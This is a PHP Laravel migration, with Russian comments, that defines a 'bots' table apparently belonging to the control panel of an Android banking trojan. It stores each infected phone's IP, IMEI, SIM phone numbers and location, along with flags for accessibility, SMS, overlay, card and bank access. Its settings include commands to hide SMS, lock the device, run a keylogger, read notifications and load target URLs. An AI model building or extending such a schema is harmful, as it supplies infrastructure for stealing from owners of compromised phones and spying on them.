<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateBotsTable extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('bots', function (Blueprint $table) {
            $table->uuid('id')->primary();

            $table->string('ip')
                ->comment('ip адрес устройства. С портом');

            $table->timestamp('last_connection')
                ->nullable()
                ->comment('Дата подключения устройства.');

            $table->string('country')
                ->nullable()
                ->comment('Название страны устройства.');

            $table->string('country_code')
                ->nullable()
                ->comment('Код страны устройства.');

            $table->string('tag')
                ->index()
                ->nullable()
                ->comment('Тег.');

            $table->boolean('update_settings')
                ->default(false)
                ->comment('Флаг для обновления настроек бота.');

            $table->integer('working_time')
                ->comment('Время работы устройства в секундах.');

            /*
            [
                0 => [
                    'operator' => 'MTS',
                    'phoneNumber' => '88005553535',
                ],
                1 => [
                    'operator' => 'MTS',
                    'phoneNumber' => '88005553536',
                ],
            ]
            */

            $table->json('sim_data')
                ->nullable()
                ->comment('JSON массив с информацией о сим-картах устройства. Формат: [{"operator":"Android","phone_number":"+15555215554","isDualSim":"false","operator1":"","phone_number1":""}]');
            /*
            [
                'android' => '10',
                'model' => 'Samsung Galaxy S 100',
                'battery_level' => 15,
                'IMEI' => '123123',
            ]
            */

            $table->json('metadata')
                ->nullable()
                ->comment("JSON массив с метаданными устройства. Формат: {android:'10',model:'Samsung Galaxy S 100','battery_level':15,'IMEI':14}");
            /*
            [
                'accessibility' => true,
                'protect' => true,
                'screen' => true,
                'sms' => true,
                'cards' => true,
                'banks' => true,
                'mails' => true,
                'download_module' => true,
                'admin' => true,
                'activeDevice' = false,
            ]
            */
            $table->json('permissions')
                ->nullable()
                ->comment('JSON массив привилегий устройства. Формат:
                    {
                        "all_permission": "true",
                        "sms_permission": "false",
                        "overlay_permission": "true",
                        "accounts_permission": "true",
                        "contacts_permission": "true",
                        "notification_permission": "false"
                    }
                ');

            $table->json('sub_info')
                ->nullable()
                ->comment('JSON массив с дополнительной информацией об устройстве. Формат:
                    {
                        "admin": "false",
                        "screen": "true",
                        "protect": "0",
                        "isDozeMode": "true",
                        "batteryLevel": "98",
                        "accessibility": "true",
                        "isKeyguardLocked": "false"
                    }
                ');

            $table->json('location')
                ->nullable()
                ->comment('JSON местоположения устройства. Формат:
                    {
                        lat:100,
                        lon:100
                    }
            ');

            $table->json('settings')
                ->comment('JSON массив с настройками. Формат: {"hideSMS":true,"lockDevice":true,"offSound":true,"keylogger":true,"clearPush":true,"readPush":true,"arrayUrl":["https://yandex.ru/", "https://yandex.ru/"]}');

            $table->boolean('is_favorite')->default(false);

            $table->boolean('is_blacklisted')->default(false);

            $table->string('comment')->nullable();

            $table->boolean('is_new')->default(true);

            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('bots');
    }
}
